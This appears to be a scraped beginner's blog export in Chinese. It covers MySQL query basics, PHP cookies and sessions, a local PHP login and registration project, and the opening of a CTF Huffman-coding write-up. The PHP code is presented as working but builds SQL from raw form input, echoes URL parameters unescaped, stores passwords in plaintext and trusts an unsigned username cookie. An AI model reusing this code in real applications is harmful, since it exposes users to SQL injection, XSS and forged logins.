比较运算符//多个条件之间可以使用or and等//select * from 表名 where 条件 例如：12345678910111213141516171819202122232425262728293031323334353637mysql&gt; select * from welcome where username=4; +----------+----------+ | username | password | +----------+----------+ | 4 | 123 | +----------+----------+ 1 row in set, 1 warning (0.00 sec) / or的用法 mysql&gt; select * from welcome where username=4 or username=3; +----------+----------+ | username | password | +----------+----------+ | 3 | 123 | | 4 | 123 | +----------+----------+ 2 rows in set, 2 warnings (0.00 sec) /and的用法 mysql&gt; select * from welcome where username&gt;1 and username&lt;4 ; +----------+----------+ | username | password | +----------+----------+ | 2 | 123 | | 2 | 123 | | 3 | 123 | +----------+----------+ 3 rows in set, 1 warning (0.00 sec) mysql&gt; select * from welcome where username&gt;=1 and username&lt;=4 ; +----------+----------+ | username | password | +----------+----------+ | 2 | 123 | | 1 | 123 | | 2 | 123 | | 3 | 123 | | 4 | 123 | +----------+----------+ 5 rows in set, 1 warning (0.00 sec) 9)排序和限制1234567排序: asc:由低到高 select * from 表名 order by 字段名 asc; desc:由高到底 select * from 表名 order by 字段名 desc; 多个字段排序 select * from 表名 order by 字段名 desc,字段名 desc; 例如：123456789101112131415161718192021222324252627282930313233343536373839/asc:由低到高mysql&gt; select * from welcome order by username asc;+----------+----------+| username | password |+----------+----------+| 1 | 123 || 2 | 123 || 2 | 123 || 3 | 123 || 4 | 123 || QTFY | 2000 |+----------+----------+6 rows in set (1.69 sec)/desc:由高到底mysql&gt; select * from welcome order by username desc;+----------+----------+| username | password |+----------+----------+| QTFY | 2000 || 4 | 123 || 3 | 123 || 2 | 123 || 2 | 123 || 1 | 123 |+----------+----------+6 rows in set (0.00 sec)/多个字段排序mysql&gt; select * from welcome order by username desc,password desc;+----------+----------+| username | password |+----------+----------+| QTFY | 2000 || 4 | 123 || 3 | 123 || 2 | 123 || 2 | 123 || 1 | 123 |+----------+----------+6 rows in set (0.00 sec) 限制:12在语句的最后面 加上limit 数字1,数字2 来进行查询数量的限制。limit 数字1,数字2 数字1代表从第几条记录开启取(是从0开始的)，数字2代表取几条！ 例如：123456789/从0条开始取一条mysql&gt; select * from welcome order by username desc limit 0,1 -&gt; ;+----------+----------+| username | password |+----------+----------+| QTFY | 2000 |+----------+----------+1 row in set (0.00 sec) 10)聚合sum求和 1select sum(字段名) from 表名; 例如;1234567mysql&gt; select sum(password) from welcome; +---------------+ | sum(password) | +---------------+ | 2615 | +---------------+ 1 row in set (1.66 sec) count记录总数1select count(*|字段名) from 表名; 例如：1234567mysql&gt; select count(*) from welcome; +----------+ | count(*) | +----------+ | 6 | +----------+ 1 row in set (1.56 sec) max最大值1select max(字段名) from 表名; 例如：1234567mysql&gt; select max(password) from welcome; +---------------+ | max(password) | +---------------+ | 2000 | +---------------+ 1 row in set (0.00 sec) min最小值1select min(字段名) from 表名; GROUP BY分类聚合1select department,sum(字段名) from 表名 group by 字段名; WITH ROLLUP分类聚合后的结果进行再汇总1select sum(字段名) from 表名 group by 字段名 with rollup; HAVING 12注意：having和where的区别在于，having是对聚合后的结果进行条件过滤，而where是在聚合前就对记录进行过滤 ，应该尽可能的对记录进行先过滤！select sum(字段名) from 表名 group by 字段名 having sum(字段名)&gt;1000; 11)表连接显示多个表中的字段的时候即可使用表连接内连接：选取两张表中相互匹配的记录例如： 12345678910111213141516171819202122232425//这样的语句可以把两张表中互相匹配的记录放在一起 mysql&gt; select * from welcome,Q where welcome.username=Q.id; +----------+----------+------+------+ | username | password | id | age | +----------+----------+------+------+ | 1 | 6 | 1 | 6 | | 2 | 5 | 2 | 5 | | 3 | 4 | 3 | 4 | | 4 | 3 | 4 | 3 | | 5 | 2 | 5 | 2 | | 6 | 1 | 6 | 1 | +----------+----------+------+------+ 6 rows in set (1.65 sec) mysql&gt; select welcome.username,Q.id from welcome,Q where welcome.username=Q.id; +----------+------+ | username | id | +----------+------+ | 1 | 1 | | 2 | 2 | | 3 | 3 | | 4 | 4 | | 5 | 5 | | 6 | 6 | +----------+------+ 6 rows in set (0.00 sec) 1内连接：select 表.字段名,.... from 表1名,表2名,... where 表1.字段=表2.字段; 外连接： 仅仅选取两张相互匹配的记录，并且会选出其他不匹配的记录左连接 概念：包含左边表中的所有记录(包括右表中没有和它匹配的记录)例如：12345678910111213mysql&gt; select * from welcome left join Q on welcome.username=Q.id; +----------+----------+------+------+ | username | password | id | age | +----------+----------+------+------+ | 1 | 6 | 1 | 6 | | 6 | 1 | 6 | 1 | | 5 | 2 | 5 | 2 | | 2 | 5 | 2 | 5 | | 3 | 4 | 3 | 4 | | 4 | 3 | 4 | 3 | +----------+----------+------+------+ 6 rows in set (0.00 sec) /查出左边表的所有记录，不管右边有没有相匹配的 右连接 概念：包含右边表中的所有记录(包括左表中没有和它匹配的记录) 左连接和右连接是可以相互转换的！例如：123456789101112mysql&gt; select * from Q right join welcome on welcome.username=Q.id; +------+------+----------+----------+ | id | age | username | password | +------+------+----------+----------+ | 1 | 6 | 1 | 6 | | 6 | 1 | 6 | 1 | | 5 | 2 | 5 | 2 | | 2 | 5 | 2 | 5 | | 3 | 4 | 3 | 4 | | 4 | 3 | 4 | 3 | +------+------+----------+----------+ 6 rows in set (0.00 sec) 12)子查询一个查询需要另外一个查询的结果参与的时候 用于子查询的关键字: in 语法：select from 表名 where id in(select 字段名 from 表名); in 在..里面 注意点 in后面的子语句必须只返回一个字段 若查询结果唯一(只有一条)可以使用=代替in not in 与in相反 exists 语法：select语句 where exists(select 语句); exists：后面那个子语句有没有查询出记录来，如果查询出记录来返回true,否则就是false 并且查询出来的记录的具体的值是NULL也是没有关系,也是返回true. not exits 与exists相反 1)select from 表名 where deptno in(select deptno from 表名); 2)若查询结果唯一可以使用=代替in select * from 表名 where deptno=(select deptno from 表名 limit 限制条件); 13)记录联合​ 需要将两个表或者多个表的数据按照一定的查询条件查询出来后，将结果合并到一起显示这是就需要用到记录联合 多个select 语句用 UNION或者UNION ALL隔开即可实现 区别： 前者 会将多个查询结果合并后并且进行去除重复后返回 后者 则直接合并并不去除重复 联合的条件：查询的列个数要相等例如： 1234567891011121314151617181920212223242526272829303132//第一种去除了重复的 mysql&gt; select * from welcome union select * from Q; +----------+----------+ | username | password | +----------+----------+ | 1 | 6 | | 6 | 1 | | 5 | 2 | | 2 | 5 | | 3 | 4 | | 4 | 3 | +----------+----------+ 6 rows in set (0.00 sec) //第二种没有去掉重复的 mysql&gt; select * from welcome union all select * from Q; +----------+----------+ | username | password | +----------+----------+ | 1 | 6 | | 6 | 1 | | 5 | 2 | | 2 | 5 | | 3 | 4 | | 4 | 3 | | 1 | 6 | | 2 | 5 | | 3 | 4 | | 4 | 3 | | 5 | 2 | | 6 | 1 | +----------+----------+ 12 rows in set (0.00 sec) mySQL中的DDL语句和DML语句都是常用的语句，总结下来，多回顾回顾。","categories":[],"tags":[]},{"title":"PHP学习总结(会话控制)","slug":"PHP学习总结(会话控制)","date":"2019-04-22T13:01:33.480Z","updated":"2019-06-06T07:25:32.566Z","comments":true,"path":"2019/04/22/PHP学习总结(会话控制)/","link":"","permalink":"http://bealright.github.io/2019/04/22/PHP学习总结(会话控制)/","excerpt":"","text":"最近刚做完一个简易的登陆注册小项目，当时做的时候匆忙，现在来详细的了解一下PHP会话控制这方面的知识。 cookie和seesion技术出现的原因： 当一个用户请求一个页面时，再请求同一个网站上的另外一个页面时，HTTP协议不能告诉我们两个请求是否来自同一个用户，也不能将两次访问联系到一起！所有出现了cookie和seesion. 一、cookiecookie是用来将网站的资料记录在客户端的技术，让web服务器将一些资料存放在客户端（用户的电脑中）。 1、向客户端电脑中设置cookie1setcookie(); 2、在服务器端上读取cookie内容1$_COOKIE 3、将多维数组应用于cookie中例如：12setcookie(\"member[name]\",'www',time()+3600);setcookie(\"member[email]\",'1111',time()+3600); 4、删除cookie例如：12345678setcookie(\"member[name]\",'',time()-3600);setcookie(\"member[email]\",'',time()-3600);//也可以采用遍历的方法foreach ($_COOKIE['member'] as $key=&gt;$val)&#123; var_dump(setcookie(\"member[&#123;$key&#125;]\",'',time()-3600)); &#125;//注意点： 使用setcookie删除cookie的时候，需要与当初设置cookie的时候参数一致！ 二、sessionsession与cookie最大的不同就是,session是把具体信息保存在服务器端。 1、开启session例如：12345session_start();$_SESSION['name']='www';$_SESSION['email']='sss';$_SESSION['url']='zzz';/再另一个PHP文件中访问的时候必须加上 2、打开已存在的seesion12session_start();var_dump($_SESSION);/注意打开之前一定要先开启seesion 3、注销变量与销毁session先开启session123456789session_start(); session_unset();/释放所有变量 session_destroy();/销毁一个会话中的所有数据 setcookie('')/名字可以在设置session时，使用var_dump($_COOKIE)来获取cookie的名字 /也可以使用这样的方法 setcookie(session_name(),'',time()-3600);//销毁保存在客户端的cookie /但这样的方法删除的不干净 /可以采用这样的方法删除干净 setcookie(session_name(),'',time()+3600,'/');'/'表示设置cookie的根目录 三、基于session和cookie的登陆模块简易的用cookie来判断登陆login.php(登陆文件) 1234567891011121314151617181920212223242526272829303132333435&lt;?php header('Content-type:text/html;charset=utf-8'); if (isset($_COOKIE['username']) &amp;&amp; $_COOKIE['username']==='QTFY') &#123; exit('您已经登录请不要重复登录'); &#125; if(isset($_POST['submit']))&#123; if(isset($_POST['username'])&amp;&amp; isset($_POST['password']) &amp;&amp; $_POST['username']==='QTFY' &amp;&amp; $_POST['password']==='123')&#123; if(setcookie('username',$_POST['username'],time()+3600))&#123; header('Location:login.php'); &#125; else&#123; echo 'cookie设置失败！'; &#125; &#125; else &#123; header('Location:skip.php?url=login.php&amp;info=用户名或密码输入错误'); //应用跳转页面 &#125; &#125; ?&gt; &lt;!DOCTYPE html&gt; &lt;html lang=\"zh-CN\"&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;请登录&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form method=\"post\" action=\"login.php\"&gt; 姓名：&lt;input type=\"text\" name=\"username\" /&gt; 密码：&lt;input type=\"password\" name=\"password\" /&gt; &lt;input type=\"submit\" name=\"submit\" value=\"登录\" /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; index.php(判断是否有cookie以此来进行识别用户身份)1234567&lt;?php header('Content-type:text/html;charset=utf-8'); if(isset($_COOKIE['username']) &amp;&amp; $_COOKIE['username']==='QTFY')&#123; echo \"&#123;$_COOKIE['username']&#125;你好，欢迎回来!\"; &#125;else&#123; echo \"&lt;a href='login.php'&gt;请重新登陆&lt;/a&gt;\"; ?&gt; 这样就可以做一个简易的登陆页面（带判断）skip.php(简单的跳转页面)12345678910111213141516171819&lt;?php header('Content-type:text/html;charset=utf-8'); if(!isset($_GET['url'])|| !isset($_GET['info']))&#123; exit(); &#125; &#125; ?&gt; &lt;!DOCTYPE html&gt; &lt;html lang=\"zh-CN\"&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;meta http-equiv=\"refresh\" content=\"3;URL=&lt;?php echo $_GET['url']?&gt;\"/&gt;//3秒 &lt;title&gt;正在跳转&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div style=\"text-align:center;font-size:20px;\"&gt;&lt;?php echo $_GET['info'] ?&gt;,三秒后自动跳转&lt;/div&gt; /info提示信息 &lt;/body&gt; &lt;/html&gt; loginout(注销功能页面)12345678910&lt;?php header('Content-type:text/html;charset=utf-8'); if (isset($_COOKIE['username']) &amp;&amp; $_COOKIE['username']==='QTFY') &#123; if(setcookie('username',$_POST['username'],time()-3600))&#123; header('Location:skip.php?url=index.php&amp;info=注销成功，正在跳转中！'); &#125;else&#123; header('Location:skip.php?url=index.php&amp;info=注销失败，请稍后重试！'); &#125; &#125;?&gt; 这样基于cookie的登陆页面就基本实现了session与cookie基本相同要注意：用session时，首先开启session。 这里就不演示了，具体的看之前做的登陆注册页面。这里又学到了一个跳转页面，之前都不知道如何用。","categories":[],"tags":[]},{"title":"HTML+CSS+PHP+COOKIE在本地搭建一个简易的登陆注册网页","slug":"HTML+CSS+PHP+COOKIE在本地搭建一个简易的登陆注册网页","date":"2019-04-20T02:03:36.405Z","updated":"2019-06-06T07:25:11.828Z","comments":true,"path":"2019/04/20/HTML+CSS+PHP+COOKIE在本地搭建一个简易的登陆注册网页/","link":"","permalink":"http://bealright.github.io/2019/04/20/HTML+CSS+PHP+COOKIE在本地搭建一个简易的登陆注册网页/","excerpt":"","text":"昨天晚上看了一叶飘零大佬的直播，大佬说：初学者最好自己先动手去做一些项目，这样能更好的了解原理，恰好学长要求做一个简易的登陆注册系统，利用这个机会再学习一波。 做了两天，搞懂了很多概念，也遇到了很多问题，但是这个过程特别有意思，记录一下，把那些学到的知识也总结一下。 一：准备工作打开mySQL打开网站根目录这里我直接放在了WWW目录下，有点乱。这样准备工作就做好了，开始奋斗了。 开始之前把我写的php文件简单描述一下：login.php（登陆页面)logincookie.php（连接数据库+设置cookie页面）welcome.php (判断是否有cookie以防绕过+登陆后呈现的页面)end.php (清除cookie页面)Register.php (注册页面)linkmysql.php（注册时连接数据库页面）Register link.php（注册判断是否注册成功和导入数据库用户信息页面）fail.php (登陆失败页面) 二：创建登陆页面和注册页面 感悟：那句话怎么说，学到用时方恨少，差不多就这个意思，之前学过HTML和CSS，但一自己写。。。，就会写个简单的表单，无非就是加一个外部样式CSS改一下背景颜色什么的。。。所以还得查大佬的。 这个样式干净又好看（自己认为），所以模仿，但是并非是复制粘贴，自己一步一步敲。。。（下面是转载自mind_programmonkey 大佬的CSS)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364html&#123; width: 100%; height: 100%; overflow: hidden; font-style: sans-serif;&#125;body&#123; width: 100%; height: 100%; font-family: 'Open Sans',sans-serif; margin: 0; background-color: #4A374A;&#125;#login&#123; position: absolute; top: 50%; left:50%; margin: -150px 0 0 -150px; width: 300px; height: 300px;&#125;#login h1&#123; color: #fff; text-shadow:0 0 10px; letter-spacing: 1px; text-align: center;&#125;h1&#123; font-size: 2em; margin: 0.67em 0;&#125;input&#123; width: 278px; height: 18px; margin-bottom: 10px; outline: none; padding: 10px; font-size: 13px; color: #fff; text-shadow:1px 1px 1px; border-top: 1px solid #312E3D; border-left: 1px solid #312E3D; border-right: 1px solid #312E3D; border-bottom: 1px solid #56536A; border-radius: 4px; background-color: #2D2D3F;&#125;.but&#123; width: 300px; min-height: 20px; display: block; background-color: #4a77d4; border: 1px solid #3762bc; color: #fff; padding: 9px 14px; font-size: 15px; line-height: normal; border-radius: 5px; margin: 0;&#125;--------------------- 作者：mind_programmonkey 来源：CSDN 原文：https://blog.csdn.net/Mind_programmonkey/article/details/78522494 这是我的HTML代码123456789101112131415161718192021222324&lt;?php?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;请登陆&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"1.css\"&gt; &lt;script src=\"main.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"login\"&gt; &lt;h1&gt;login&lt;/h1&gt; &lt;form action=\"logincookie.php\" method=\"post\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"用户名\" /&gt;&lt;input type=\"password\" name=\"password\" placeholder=\"密码\" /&gt; &lt;br /&gt; &lt;button class=\"tj\" type=\"submit\"&gt;登陆&lt;/button&gt; &lt;/form&gt; &lt;form action=\"Register.php\" method=\"post\"&gt; &lt;button class=\"zc\" type=\"submit\"&gt;注册&lt;/button&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 做之前没有懂其中的一些东西，现在做完了把之前不懂的弄懂。（下面是我的，就是一些值改过）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172body &#123; width: 100px; height: 100px; background-color: beige; background-image: url(28.jpg);//加一张图片&#125;#login&#123; position: absolute;//通过绝对定位，元素可以放置到页面上的任何位置。下面的标题距离页面左侧 50%，距离页面顶部 50%。 top:50%; left:50%; margin: -150px 0 0 -150px;//这个简写属性设置一个元素所有外边距的宽度，或者设置各边上外边距的宽度。该属性可以有 1 到 4 个值，上外边距是 -150px，右外边距是 0px，下外边距是 0px，左外边距是 -150px width: 300px; height: 300px;&#125;#login h1&#123; color: #9393FF; text-shadow: 0 0 10px;//text-shadow 属性向文本设置阴影,其他添加的效果可以在W3school查到。 letter-spacing: 1px;//letter-spacing 属性增加或减少字符间的空白（字符间距） text-align: center;//text-align 属性规定元素中的文本的水平对齐方式，这里是居中对齐。&#125;h1 &#123; font-size: 2em; margin: 0.67em 0;&#125;input &#123; width: 300px; height: 20px; margin-bottom: 10px;//margin-bottom 属性设置元素的下外边距 outline: none;//outline （轮廓）是绘制于元素周围的一条线，位于边框边缘的外围，可起到突出元素的作用 padding: 10px;//padding 简写属性在一个声明中设置所有内边距属性,所有 4 个内边距都是 10px. font-size: 20px; color: #fff; text-shadow: 1px 1px 1px;//text-shadow属性向文本设置阴影 border-top: 1px solid #312E3D;//border-top 属性在一行声明中为上边框设置所有的属性 border-left: 1px solid #312E3D; border-right: 1px solid #312E3D; border-bottom: 1px solid #56536A; border-radius: 4px; background-color:#2D2D3F;&#125;.tj &#123; width: 300px; min-height: 20px; display: block; background-color: #4a77d4; border: 1px solid #3762bc;//border 简写属性在一个声明设置所有的边框属性 color: #fff; padding: 9px 14px; font-size:15px; line-height: normal;// border-radius: 5px; margin: 0px;&#125;.zc &#123; width: 300px; min-height: 20px; display: block; background-color: #33CC33; border: 1px solid #3762bc; color: #fff; padding: 9px 14px; font-size:15px; line-height: normal;//line-height 属性设置行间的距离（行高） border-radius: 5px; margin: 0px;&#125; 了解了这些属性，但还是不知道为啥大佬这样设置其中的一些数据，毕竟目前是小白，慢慢来吧。 我用的是CSS外部样式表,把CSS存到1.css文件中，在login.php（登陆页面）文件中引用。1&lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"1.css\"&gt; 这样，就完成了第一步！实现效果如下：在登陆页面加一个注册按钮 在1.css里面添加一段12345678910111213.zc &#123; width: 300px; min-height: 20px; display: block; background-color: #33CC33; border: 1px solid #3762bc; color: #fff; padding: 9px 14px; font-size:15px; line-height: normal;//line-height 属性设置行间的距离（行高） border-radius: 5px; margin: 0px;&#125; 实现效果：再做一个注册页面（Register.php），采用相同的CSS，换个颜色即可。Register.php代码如下：1234567891011121314151617181920&lt;?php?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;请注册&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"3.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"Register\"&gt; &lt;h1&gt;Register&lt;/h1&gt; &lt;form action=\"Register link.php\" method=\"POST\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"请输入用户名\" /&gt;&lt;input type=\"password\" name=\"password\" placeholder=\"请输入密码\" /&gt; &lt;br /&gt; &lt;button class=\"zc\" type=\"submit\"&gt;注册&lt;/button&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 实现效果如下：这样就实现了登陆页面和注册页面。 三：连接mySQL和设置COOKIE我们的登陆页面和注册页面都已经做好了，现在就来写一个PHP文件来连接数据库并且设置一下cookie.logincookie.php（连接数据库+设置cookie页面）代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php//第一次登陆的时候，通过用户输入的信息来确认用户header('Content-type: texy/html;charset=utf-8');//设置编码，防止乱码if ( ( $_POST['username'] != null ) &amp;&amp; ( $_POST['password'] != null ) ) &#123;//判断输入是否为空 $userName = $_POST['username'];//post方式接收传来的参数，用定义的$userName和$password接收 $password = $_POST['password']; //从数据库获取用户信息 //数据库连接信息 分别为主机 数据库用户名 密码 $conn = mysqli_connect('localhost','root','root'); mysqli_select_db($conn,'login');//连接所创建的login数据库 $sql = \"select * from user where username = '$userName'\";//从数据库表中获取数据 $res = mysqli_query($conn,$sql);//针对login这个数据库进行查询, 查询是否存在有这个用户名 $row = mysqli_fetch_array($res);//输出查询结果，传给$row if ($row['username']!=$userName) &#123; echo '不能登陆'; header('Location:fail.php'); &#125; else if($row['username']==$userName&amp;&amp;$row['password']!=$password) &#123; echo '不能登陆'; header('Location:fail.php'); &#125; else if($row['username']!=$userName&amp;&amp;$row['password']!=$password) &#123; echo '不能登陆'; header('Location:fail.php'); &#125; else if($row['username']==$userName&amp;&amp;$row['password'] ==$password) &#123; //如果密码验证通过，设置一个cookies，把用户名保存在客户端 setcookie('username',$userName,time()+3600);//设置一个小时 //最后跳转到登录后的欢迎页面 echo '登陆成功'; header('Location:welcome.php');//跳转到最后的欢迎页面 &#125;&#125;else &#123; echo '登陆失败'; header('Location:fail.php');//跳转到失败页面&#125; 这里面的PHP连接数据库语法，需要学习一下才能知道这些语句的意思。w3school网站这个网站特别好，特别详细，从这里面可以学习到PHP连接mySQL语法。123例如：mysql_connect(servername,username,password);//主机名、数据库用户名、密码//一般初始的数据库用户名和密码都是 root 语法学习会再总结一个单独的博客来记录一下，这里主要介绍一下搭建流程和遇到的问题。 通过PHP连接mySQL语法我们就可将用户输入的信息用POST方式传入到数据库中，然后利用查询语句进行查询数据库数据，进行比对，然后判断用户名和密码是否与数据库所存数据相同。 接下来实现cookie，一开始真的不知道有什么用处，查了一些博客，看了一些概念，就知道是把用户的信息存储到客户端，方便用户下次登入。但其实cookie也可以设置防绕过的功能，就例如：如果我不设置cookie，那么我的登陆页面和最终页面都是独立的，靠的也只是HTML中的&lt;form action=&quot; &quot;&gt; 来连接进行跳转功能。但这样不安全，如果对方注册一个用户，登陆到你的最终页面，可以直接在url地址栏里直接输入这个文件，例如我的最终页面是welcome.php，对方一输入没有如何阻拦，直接就可以进入。所以设置cookie的作用不仅是把用户的信息保存在客户端，更重要的防止绕过。 cookie的具体介绍可以看一下B站孙胜利老师的讲解的和菜鸟教程官网上的介绍，特别详细。 一开始模仿大佬做，设置了两个cookie，一个是用户名的。另一个是密码的，但已经写过注销cookie了PHP文件却依旧能在url地址栏里直接进入后台，一开始真的不知道错误点在那，搞了很长时间，但这个过程及其有意思，查资料，问朋友，自己修改代码。最后发现。。。，其实完全不用设置密码的cookie了，我设置用户名cookie的前提便是用户名输入和数据库密码相等了，所以只要设置一个用户名cookie，便能够识别和登陆。也可以在注销cookie时，把密码的cookie注销，之前直接能登入后台就是因为我设置了两个cookie，却只清除了一个。。。 找到问题所在就可以成功设置好cookie，并且注销cookie了。 四：实现登陆功能和注销cookie在上面我们实现了两个页面，一个是登陆页面，一个连接数据库+cookie的，下面我们还需要两个页面。一个登陆失败页面（fail.php）代码如下： 1234567891011121314151617&lt;?php?&gt; &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt; &lt;title&gt;登陆失败&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"2.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"login\"&gt; &lt;h1&gt;请重新登陆&lt;/h1&gt; &lt;/div&gt; &lt;a href=\"login.php\"&gt;重新登陆&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 可以看logincookie.php的代码中，如果用户名和密码有一个不正确的时候，都会跳转到fail.php页面。实现效果：下面我们再实现一个用户登陆成功的页面（welcome.php）代码如下：1234567891011121314151617181920&lt;?php if(!isset($_COOKIE['username']))&#123;//如果cookie没有设置，则不能登陆。 echo '不能登陆'; exit(); &#125;?&gt;//上面的代码便是设置cookie的作用便用于此，这样便可防止直接登入后台&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;请登陆&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"4.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"Landingsuccessfully\"&gt; &lt;h1&gt;Landingsuccessfully&lt;/h1&gt; &lt;a href=\"end.php\"&gt;Please cancel&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 实现效果：直接从url里面登陆，显示结果：正常用户登陆，显示结果：因为我设置的cookie是一个小时的，我们需要手动清除一下cookie，否则客户端会保留cookie，下次在url里直接可以登陆后台。 所以再写一个注销cookie的页面（end.php）代码如下：12345678&lt;?php ini_set(\"error_reporting\",\"E_ALL &amp; ~E_NOTICE\"); header('Content-type:text/html;charset=utf-8');if (isset($_COOKIE['username'])) &#123; setcookie('username',$userName,time()-3600); echo '注销成功';&#125;?&gt; 之前这个页面老是报错，大致便是Notice:Undefined varialbe:变量名称，但注销功能能正常实现，加上 ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); 便可以解决报错问题，查资料发现。在4.3.0中运行正常，在4.3.1中运行会提示Notice:Undefined varialbe:tmp_i修改方法：在程序开头加一句：error_reporting(E_ALL &amp; ~E_NOTICE); 或error_reporting(E_ALL ^ E_NOTICE);具体查看：报错原因和修改方法 这样就实现了cookie注销的功能了实现效果 ：进行一下测试，看是否清除cookie。在url地址栏里直接登陆后台试试ok,看来确实注销成功了，完成咯。 五：实现注册功能登陆功能也完全实现了，接下来我们就实现一下注册功能。这里我们又写了三个页面（好乱），不过毕竟是小白，只要能写出来就行。首先是注册页面（Register.php）代码如下： 1234567891011121314151617181920&lt;?php?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;请注册&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"3.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"Register\"&gt; &lt;h1&gt;Register&lt;/h1&gt; &lt;form action=\"Register link.php\" method=\"POST\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"请输入用户名\" /&gt;&lt;input type=\"password\" name=\"password\" placeholder=\"请输入密码\" /&gt; &lt;br /&gt; &lt;button class=\"zc\" type=\"submit\"&gt;注册&lt;/button&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 接下来是连接数据库(linkmysql.php)代码如下：123456&lt;?php header(\"Content-type: text/html; charset=utf-8\");//设置编码,防止乱码 $con = mysql_connect(\"localhost\",\"root\",\"root\") or die(\"数据库连接失败\"); mysql_select_db('login') or die(\"指定的数据库不能打开\"); mysql_query(\"set names utf8\");?&gt; 再就是导入信息的页面（Register link.php）代码如下：123456789101112131415161718192021222324252627282930&lt;?php require_once(\"linkmysql.php\");//首先连接数据库 $name=trim($_POST['username']); //trim函数，过滤空格，使用trim函数，我们可以把表单中空格给过滤掉 $password=$_POST['password']; $sql = \"select * from user where username='$name'\";//从数据库查找用户名数据 $info = mysql_query($sql);//函数执行一条 MySQL 查询 $res = mysql_num_rows($info);//返回一行的结果 if(empty($name))&#123;//empty() 函数用于检查一个变量是否为空。 echo \"&lt;script&gt;alert('用户名不能为空');location.href='login.php';&lt;/script&gt;\"; &#125;else if(empty($password))&#123; echo \"&lt;script&gt;alert('密码不能为空');location.href='login.php';&lt;/script&gt;\"; &#125;else&#123; if($res)&#123; echo \"&lt;script&gt;alert('用户名已存在');location.href='login.php';&lt;/script&gt;\"; &#125;else&#123; $sql1 =\"insert into user(username,password) values('\".$name.\"','\" .$password.\"')\";//PHP MySQL 插入数据 $result = mysql_query($sql1);//判断插入数据是否成功 if($result)&#123; echo \"&lt;script&gt;alert('注册成功')&lt;/script&gt;\"; header('Location:login.php'); &#125;else&#123; echo \"&lt;script&gt;alert('注册失败')&lt;/script&gt;\"; &#125; &#125;&#125; ?&gt; 这样就实现了注册功能。这里面涉及了数据库的PHP mySQL插入的语法，可以在菜鸟教程学习，之后再写一篇总结一下这些语句的用法。 🆗，到此为止我们就实现了简易的登陆注册页面。 虽然这个项目很小，但做出了真的很有成就感，同时觉得学习的东西真的好有意思，加油，继续努力学习（开心！！！）。","categories":[],"tags":[]},{"title":"CTF Crypto(密码学)总结","slug":"CTF Crypto(密码学)总结","date":"2019-04-16T02:45:19.969Z","updated":"2019-06-06T07:24:53.349Z","comments":true,"path":"2019/04/16/CTF Crypto(密码学)总结/","link":"","permalink":"http://bealright.github.io/2019/04/16/CTF Crypto(密码学)总结/","excerpt":"","text":"最近接触了一些密码学的题，感觉特别有意思，写下博客来记录一下，以免忘记 一：哈夫曼树.png?raw=true)哈夫曼树（也称为最优二叉树），虽然（目前）没学，但是百度、谷歌大法无敌。查查原理，再去做题。经过一番查找，懂了原理，就总结了一下简单说：叶子结点：权值a : 4d ：9g : 1f : 5l : 10 : 75 : 9{ : 1} : 1 画图时最上面的是根，而最优二叉树的规则则是需要权值大的尽量放在上面例如：叶子结点：权值a 7b 5c 2d 4搞懂了这个，但是这个题中还给了我们一堆数111000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110 这些代表上面意思那？？经过查找发现发现原来这是哈夫曼树编码详细的介绍 那我们先来完成第一步，画树。一开始没画对，画了三四遍，才算画出来，不过不太熟练，还得练。画的时候最好从下到上画，先把权值小的画出来，一步一步往上画。 既然画出来了，那就用哈夫曼树编码来把每个数字或字符用编码的方式表示出来。通过画也发现在同一分支中，哪个权值大，那么哪个就是1。例如:17下的d（权值为9）和权值为8的相比，那么d的路径就表示为1. 接下来就是安装这样的方法把那么字符都用编码表示出来 f:110 l:00111 a:000 g:00101 ..... 下面都这样表示接下来就开始进行比对111000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110 一般CTF题的提交格式都是flag{……}所以我们这里就首先看第一个是不是f110 恰好对应 f00111 恰好对应 l000 恰好对应 a00101 恰好对应 